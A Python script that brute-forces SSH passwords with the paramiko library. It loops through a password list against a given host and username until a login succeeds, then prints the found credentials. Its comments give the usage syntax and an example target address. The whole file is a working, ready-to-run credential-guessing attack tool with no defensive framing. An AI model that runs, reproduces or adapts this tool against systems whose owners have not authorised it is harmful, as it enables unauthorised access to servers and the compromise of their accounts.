import os.path
import sys
import paramiko # SSHv2 native ssh client (using OpenSSH as fallback)

# ---------------- NOTES ---------------- #
# this is password guessing python over ssh 2.7.1 code written by Ofek Bader, VERSION 1.0
# last update: 03/11/2018 12:13
# arguments: [1] ip/host address, [2] default remote username, [3] passwords txt file.
# dependencies: 'paramiko' (pip install paramiko)
# syntax: [TARGET_ADDRESS] [USER_NAME] [password.txt_FILE]
# example: 195.144.107.198 demo pass.txt
# ---------------- NOTES ---------------- #

# ----------- DEVELOPER NOTES ----------- #
# none
# ----------- DEVELOPER NOTES ----------- #

# get command line arguments
args = (sys.argv) # get text file with passwords as a dictionary

if args.__len__() < 4:
    print("Invalid arguments... quitting...")
    quit()

# open/create file for read only
if os.path.exists(args[3]):
    f = open(args[3], "r")
else: 
    print("file cannot be found... quitting...")
    quit()

# get SSH Client from paramiko library
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # set auto add hosts

address = args[1] # target address
user = args[2] # remote username
passw = f.readline() # remote password, from file
passw = passw[:len(passw)-1] # cut the line break '\n'

while True:
    try:
        print("TRYING, user: "+user+", pass: "+passw)
        client.connect(address, username = user, password = passw) # connecting via ssh with user and passw
        break
    except paramiko.AuthenticationException as authe: # in ssh connection, wrong user/pass
        print(authe.message)
        passw = f.readline() # get the next password
        passw = passw[:len(passw)-1] # cut the line break '\n'
        if len(passw) == 0: # if EOF
            break
    except Exception as e: # ERROR, Could not establish ssh connection.
        print("*** Caught exception: %s: %s" % (e.__class__, e))
        print("could not create connection, check your internet connection and target's address")
        quit()

# close connection/socket
client.close()

if len(passw) > 0:
    print("*--- Found! ---*\n**-------------**\nusername: "+user+"\npassword: "+passw+"\n**-------------**")
else:
    print("*----------------------*\nCould not find matching username and password...")

